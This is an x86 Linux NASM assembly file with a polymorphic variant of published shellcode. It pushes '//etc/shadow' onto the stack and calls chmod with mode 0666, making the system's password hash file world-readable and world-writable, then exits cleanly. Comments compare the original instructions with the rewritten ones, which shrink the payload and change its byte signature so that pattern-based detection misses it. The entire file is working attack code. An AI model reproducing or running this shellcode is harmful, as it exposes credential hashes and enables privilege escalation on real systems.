;Filename: chmod.nasm
;Nasm code obtained from: http://shell-storm.org/shellcode/files/shellcode-566.php
;Polymorphic version author: MrSquid

;Original Lenght: 27

;Polymorphic version: 23

global _start 

section .text

_start:

        ; chmod("//etc/shadow", 0666);
        ;mov al, 0xf 		;15  Original line
	push 0xf 		;Mofidied line
	pop eax  		;Modified line       
	;cdq			;original Line
        ;push edx		;Original Lin
	push ecx		;Modified line
        push dword 0x776f6461
	push dword 0x68732f63
        push dword 0x74652f2f
        mov ebx, esp
        ;mov cx, 0666o 		;Original line
	push 0x1b6		;Modified line
	pop ecx    		;Modified line
	int 0x80
	;Original code doesn't have exit function. Added exit function for a clean exit.
	push 0x1
	pop eax
	int 0x80 

